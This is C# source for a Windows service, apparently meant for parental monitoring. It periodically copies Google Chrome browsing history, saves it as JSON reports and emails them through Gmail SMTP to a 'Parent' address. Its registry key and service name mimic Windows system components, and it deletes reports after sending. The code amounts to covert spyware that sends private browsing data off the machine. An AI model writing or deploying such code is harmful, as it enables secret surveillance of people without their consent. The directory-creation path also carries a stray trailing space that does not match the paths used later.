using Microsoft.Win32;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.Mime;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;

namespace Observer
{
    public partial class WindowsObserver : ServiceBase
    {
        private System.Timers.Timer timer;

        public string SendTo;
        private string SendFrom;
        private string SendFromPassword;
        private string UserName;
        private int ReportCount;
        private int ReportTimeoutMinutes;
        
        ChromeBrowser cb;
        int iteration;

        string LocalApplicationDataFolder;
        string ReportFolder;
        string HistoryCopyFolder;

        public WindowsObserver()
        {
            InitializeComponent();
        }

        void SendReport(string browserName, string report)
        {
            console.WriteEntry($"SendReport browserName={browserName}; report={report}");

            var fromAddress = new MailAddress(SendFrom, $"Report from {UserName}");
            var toAddress = new MailAddress(SendTo, "Parent");

            var smtp = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(fromAddress.Address, SendFromPassword)
            };

            Attachment attachment = new Attachment(report, MediaTypeNames.Application.Octet);
            ContentDisposition disposition = attachment.ContentDisposition;
            disposition.CreationDate = File.GetCreationTime(report);
            disposition.ModificationDate = File.GetLastWriteTime(report);
            disposition.ReadDate = File.GetLastAccessTime(report);
            disposition.FileName = Path.GetFileName(report);
            disposition.Size = new FileInfo(report).Length;
            disposition.DispositionType = DispositionTypeNames.Attachment;

            using (var message = new MailMessage(fromAddress, toAddress))
            {
                message.Subject = $"Report from {UserName}";
                message.Body = "Open report in ReportViewer";

                message.Attachments.Add(attachment);

                smtp.Send(message);
            }

            File.Delete(report);

            iteration = 0;
        }
        void SaveReport(string browserName, List<HistoryElement> history)
        {
            if (!Directory.Exists($@"{ReportFolder}\{browserName} "))
                Directory.CreateDirectory($@"{ReportFolder}\{browserName} ");

            using (StreamWriter sw = File.CreateText($@"{ReportFolder}\{browserName}\{DateTime.Now.ToShortDateString()} {DateTime.Now.ToShortTimeString().Replace(':', '_')}.json"))
                sw.Write(JsonConvert.SerializeObject(history));

            console.WriteEntry($"SaveReport browserName={browserName}; history.Count={history.Count}");
        }
        string PrepareReport(string browserName)
        {
            string path = $@"{ReportFolder}\{browserName}\{DateTime.Now.ToShortDateString()} {DateTime.Now.ToShortTimeString().Replace(':', '_')}.json";

            List<HistoryElement> listForWrite = new List<HistoryElement>();

            foreach (var item in Directory.GetFiles($@"{ReportFolder}\{browserName}"))
            {
                var list2 = JsonConvert.DeserializeObject<List<HistoryElement>>(File.ReadAllText(item));

                if (listForWrite.Count == 0)
                    listForWrite.AddRange(list2);
                else
                    listForWrite = listForWrite.Union(list2).ToList();


                File.Delete(item);
            }

            using (StreamWriter sw = File.CreateText(path))
                sw.Write(JsonConvert.SerializeObject(listForWrite));

            console.WriteEntry($"PrepareReport browserName={browserName}; path={path}");

            return path;
        }

        void GetGoogleChromeHistory(bool send = false)
        {
            cb.UpdateHistory();
            SaveReport(cb.Name, cb.History);

            if (send)
                SendReport(cb.Name, PrepareReport(cb.Name));
        }

        protected override void OnStart(string[] args)
        {
            RegistryKey Key = Registry.LocalMachine.CreateSubKey($"SOFTWARE\\Windows Login\\Services data");

            SendTo = Key.GetValue("Arg0", string.Empty).ToString();
            SendFrom = Key.GetValue("Arg1", string.Empty).ToString();
            SendFromPassword = Key.GetValue("Arg2", string.Empty).ToString();
            UserName = Key.GetValue("Arg3", string.Empty).ToString();
            ReportCount = Key.GetValue("Arg4", string.Empty).ToString().ToInt(1);
            ReportTimeoutMinutes = Key.GetValue("Arg5", string.Empty).ToString().ToInt(1);

            LocalApplicationDataFolder = Key.GetValue("Arg98", string.Empty).ToString();
            ReportFolder = $@"{LocalApplicationDataFolder}\{Guid.NewGuid().ToString()}\report\";
            HistoryCopyFolder = $@"{LocalApplicationDataFolder}\{Guid.NewGuid().ToString()}\temp";

            cb = new ChromeBrowser(LocalApplicationDataFolder, HistoryCopyFolder);

            console.WriteEntry($"LocalApplicationDataFolder={LocalApplicationDataFolder}; ReportFolder={ReportFolder}; HistoryCopyFolder={HistoryCopyFolder};");

            timer = new System.Timers.Timer(1000 * 60 * ReportTimeoutMinutes)
            {
                AutoReset = true
            };
            timer.Elapsed += TimerElapsed;
            timer.Start();
        }
        protected override void OnStop()
        {
            timer.Stop();
            timer = null;
        }
        private void TimerElapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            iteration++;
            GetGoogleChromeHistory(iteration > ReportCount);
        }
    }
}
